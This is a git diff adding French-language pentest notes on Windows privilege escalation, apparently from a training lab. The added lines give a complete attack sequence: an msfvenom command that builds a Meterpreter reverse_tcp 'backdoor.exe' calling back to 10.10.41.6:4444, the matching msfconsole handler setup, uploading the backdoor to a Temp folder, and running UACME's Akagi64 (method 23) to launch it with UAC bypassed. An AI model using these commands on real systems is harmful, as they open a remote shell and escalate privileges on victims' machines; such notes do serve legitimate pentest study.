@@ -34,6 +34,27 @@ Il est possible de bypasser UAC par différents outils. Tout dépend de la versi
 * Migrer d'un meterpreter x86 vers x64 : `pgrep explorer`, une valeur est rencoyée, puis `migrate <Number>`, nous obtenons un meterpreter x64.  
 * `getprivs` permet de voir les privilèges du user actuel.  
 * `net localgroup administrators` : Nous permet de voir les comptes membres du groupes des admins locaux.  
+* `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.41.6 LPORT=4444 -f exe > 'backdoor.exe'` : générer un exécutable Windows malveillant qui, une fois exécuté sur une machine cible, ouvre une connexion inverse (reverse shell) vers ma machine :
+>``-p windows/meterpreter/reverse_tcp``
+>* ➡️ Payload utilisé :
+>``windows`` : système cible
+>``meterpreter`` : shell avancé (mémoire, fichiers, processus, etc.)
+>``reverse_tcp`` : la victime initie la connexion vers toi
+> ``-f exe``
+> ➡️ Format de sortie : exe = fichier exécutable Windows.
+
+* **côté attaquant**
+msfconsole  
+use exploit/multi/handler  
+set payload windows/meterpreter/reverse_tcp  
+set LHOST 10.10.41.6  
+set LPORT 4444  
+run  
+
+* Retourner sur le meterpreter : ``cd C:\\``, `mkdir Temp`, `cd Temp`, `upload backdoor.exe` (pour envoyer dans le dossier Temp, sur machine distante).
+* Envoyer Aakgi64 sur machine cible : `upload /root/Desktop/tools/UACME/Akagi64.exe`  
+* `Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe` (Akagi outil connu pour exploiter des techniques de bypass UAC sur Windows). "23" est l'ID de la méthode à lancer.    
+
 
 
 
